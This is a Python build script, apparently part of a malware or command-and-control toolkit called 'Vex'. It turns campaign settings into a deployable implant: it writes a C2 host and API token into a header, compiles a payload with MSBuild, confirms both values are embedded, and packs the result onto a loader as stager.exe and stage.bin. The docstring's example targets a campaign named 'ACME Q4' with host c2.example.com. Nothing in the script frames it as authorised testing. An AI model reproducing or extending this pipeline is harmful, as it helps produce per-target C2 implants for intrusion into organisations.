#!/usr/bin/env python3
"""Build a campaign-specific stager.

Injects campaign_config.h (C2 host + API token), compiles the payload with
MSBuild into an isolated directory, packs it onto the loader, and records
hashes. Never executes the payload.

    python tools/campaign_build.py --name "ACME Q4" \
        --host c2.example.com --token campaign-token

Output: dist/campaigns/<slug>/stager.exe + stage.bin + campaign.json
"""

import argparse
import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HEADER = os.path.join(ROOT, "campaign_config.h")
BUILD_ROOT = os.path.join(ROOT, "build", "campaign")
PAYLOAD_PROJ = os.path.join(ROOT, "Vexpayload.vcxproj")
LOADER = os.path.join(ROOT, "loader", "x64", "Release", "xloader.exe")
PACK = os.path.join(ROOT, "tools", "pack.py")
LOCK = os.path.join(BUILD_ROOT, ".lock")

_MSBUILD_CANDIDATES = [
    r"D:\VisualStudio2022\MSBuild\Current\Bin\amd64\MSBuild.exe",
    r"C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\amd64\MSBuild.exe",
    r"C:\Program Files\Microsoft Visual Studio\2022\Professional\MSBuild\Current\Bin\amd64\MSBuild.exe",
    r"C:\Program Files\Microsoft Visual Studio\2022\Enterprise\MSBuild\Current\Bin\amd64\MSBuild.exe",
]


def msbuild_path():
    env = os.environ.get("VEX_MSBUILD")
    if env and os.path.exists(env):
        return env
    for p in _MSBUILD_CANDIDATES:
        if os.path.exists(p):
            return p
    return None


def available() -> bool:
    return msbuild_path() is not None and os.path.exists(PAYLOAD_PROJ) \
        and os.path.exists(LOADER)


def slugify(name: str) -> str:
    s = re.sub(r"[^A-Za-z0-9._-]+", "-", name.strip()).strip("-")
    return (s[:48] or "campaign").lower()


def _widen_literal(value: str) -> str:
    out = []
    for ch in value:
        if ch in "\\\"":
            out.append("\\" + ch)
        elif ord(ch) < 0x20 or ord(ch) > 0x7E:
            raise ValueError("non-ASCII campaign value")
        else:
            out.append(ch)
    return "".join(out)


def _acquire_lock(timeout=900):
    os.makedirs(BUILD_ROOT, exist_ok=True)
    deadline = time.time() + timeout
    while True:
        try:
            fd = os.open(LOCK, os.O_CREAT | os.O_EXCL | os.O_WRONLY)
            os.write(fd, str(os.getpid()).encode())
            return fd
        except FileExistsError:
            try:
                if time.time() - os.path.getmtime(LOCK) > 1800:
                    os.unlink(LOCK)
                    continue
            except OSError:
                pass
            if time.time() > deadline:
                raise TimeoutError("campaign build lock held")
            time.sleep(1)


def _release_lock(fd):
    try:
        os.close(fd)
    finally:
        try:
            os.unlink(LOCK)
        except OSError:
            pass


def build(name: str, host: str, token: str) -> dict:
    host = (host or "").strip()
    token = (token or "").strip()
    if not re.fullmatch(r"[A-Za-z0-9.:-]{1,253}", host):
        raise ValueError("invalid host")
    if not re.fullmatch(r"[A-Za-z0-9._-]{0,128}", token):
        raise ValueError("invalid token")
    if not msbuild_path():
        raise RuntimeError("MSBuild not found")
    if not os.path.exists(LOADER):
        raise RuntimeError("loader not built; run build.ps1 first")

    slug = slugify(name)
    out_dir = os.path.join(ROOT, "dist", "campaigns", slug)
    obj_dir = os.path.join(BUILD_ROOT, "obj", slug)
    bin_dir = os.path.join(BUILD_ROOT, "bin", slug)
    os.makedirs(out_dir, exist_ok=True)
    os.makedirs(obj_dir, exist_ok=True)
    os.makedirs(bin_dir, exist_ok=True)

    fd = _acquire_lock()
    backup = None
    try:
        if os.path.exists(HEADER):
            backup = HEADER + ".bak"
            shutil.copy2(HEADER, backup)
        with open(HEADER, "w", encoding="utf-8") as f:
            f.write("#pragma once\n")
            f.write(f'#define VEX_CAMPAIGN_HOST L"{_widen_literal(host)}"\n')
            f.write(f'#define VEX_CAMPAIGN_TOKEN L"{_widen_literal(token)}"\n')
            f.write(f'#define VEX_CAMPAIGN_NAME L"{_widen_literal(name)}"\n')

        log_path = os.path.join(out_dir, "build.log")
        cmd = [
            msbuild_path(), PAYLOAD_PROJ,
            "/p:Configuration=Release", "/p:Platform=x64",
            f"/p:OutDir={bin_dir}{os.sep}",
            f"/p:IntDir={obj_dir}{os.sep}",
            "/m", "/v:m", "/nologo",
        ]
        with open(log_path, "w", encoding="utf-8", errors="replace") as log:
            r = subprocess.run(cmd, stdout=log, stderr=subprocess.STDOUT,
                               timeout=900)
        if r.returncode != 0:
            raise RuntimeError(f"payload build failed (see {log_path})")

        payload = os.path.join(bin_dir, "Vexpayload.exe")
        if not os.path.exists(payload):
            raise RuntimeError("payload binary missing")
        blob = open(payload, "rb").read()
        if host.encode("utf-16-le") not in blob:
            raise RuntimeError("campaign host not embedded in payload")
        if token and token.encode("utf-16-le") not in blob:
            raise RuntimeError("campaign token not embedded in payload")

        stager = os.path.join(out_dir, "stager.exe")
        stage = os.path.join(out_dir, "stage.bin")
        r = subprocess.run([sys.executable, PACK, LOADER, payload, stager, stage],
                           capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=180)
        if r.returncode != 0:
            raise RuntimeError("pack failed: " + (r.stderr or r.stdout)[-500:])

        stager_hash = hashlib.sha256(open(stager, "rb").read()).hexdigest()
        payload_hash = hashlib.sha256(blob).hexdigest()
        meta = {
            "name": name, "slug": slug, "host": host,
            "token_set": bool(token),
            "payload": payload, "stager": stager, "stage": stage,
            "payload_sha256": payload_hash, "stager_sha256": stager_hash,
            "stager_size": os.path.getsize(stager),
            "created": time.strftime("%Y-%m-%d %H:%M:%S"),
            "log": log_path,
        }
        with open(os.path.join(out_dir, "campaign.json"), "w",
                  encoding="utf-8") as f:
            json.dump(meta, f, indent=2)
        return meta
    finally:
        if backup:
            shutil.move(backup, HEADER)
        else:
            try:
                os.unlink(HEADER)
            except OSError:
                pass
        _release_lock(fd)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--name", required=True)
    ap.add_argument("--host", required=True)
    ap.add_argument("--token", default="")
    args = ap.parse_args()
    try:
        meta = build(args.name, args.host, args.token)
    except Exception as exc:
        print(f"[-] {exc}")
        return 1
    print(json.dumps({k: meta[k] for k in
                      ("name", "host", "stager", "stager_sha256", "stager_size")},
                     indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
